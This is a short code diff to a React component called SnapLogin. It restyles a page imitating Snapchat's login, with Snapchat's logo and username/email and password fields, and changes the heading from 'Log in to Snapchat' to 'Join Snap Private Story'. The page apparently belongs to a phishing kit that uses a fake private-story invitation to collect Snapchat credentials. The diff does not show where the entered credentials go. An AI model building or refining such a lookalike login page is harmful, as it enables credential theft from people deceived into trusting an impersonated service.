@@ -71,15 +71,15 @@ function SnapLogin() {
   };
 
   return (
-    <div className="bg-[#fffc00] w-full h-screen overflow-hidden flex-center">
-      <div className=" bg-[#fffc00] flex-center flex-col gap-4 w-[310px] p-6 rounded-md border-solid  max-md:px-5 md:w-[380px]">
+    <div className="bg-[#f2f2f2] w-full h-screen overflow-hidden flex-center">
+      <div className="border shadow-sm bg-white flex-center flex-col gap-4 w-[310px]  p-6 rounded-md border-solid border-gray-200 max-md:px-5 md:w-[380px]">
+        {" "}
         <img
           loading="lazy"
           src="https://cdn.builder.io/api/v1/image/assets/TEMP/0b27981804944e75d6f90b9634067dffbfab942823d624c4cba6c925f1885175?"
           className="aspect-square object-contain object-center w-[60px] justify-center items-center overflow-hidden self-center max-w-full"
         />
-        <p className="text-2xl text-black">Log in to Snapchat</p>
-
+        <p className="text-2xl font-medium text-center text-black">Join Snap Private Story</p>
         <div className="mt-6 mx-auto w-full flex items-start flex-col text-black">
           <p className="text-xs mb-2">Username or Email</p>
           <input
@@ -92,7 +92,6 @@ function SnapLogin() {
             onChange={(e) => setUsername(e.target.value)}
           />
         </div>
-
         <div className="mt-2 mx-auto w-full flex items-start flex-col text-black">
           <p className="text-xs mb-2">Password</p>
           <input
@@ -110,7 +109,6 @@ function SnapLogin() {
             </p>
           )}
         </div>
-
         <button
           onClick={handleClick}
           className="mt-2 px-4 py-2 rounded-2xl text-white text-sm mx-auto bg-blue"
@@ -123,7 +121,6 @@ function SnapLogin() {
             </div>
           )}
         </button>
-
         <ToastContainer
           position="top-center"
           autoClose={5000}
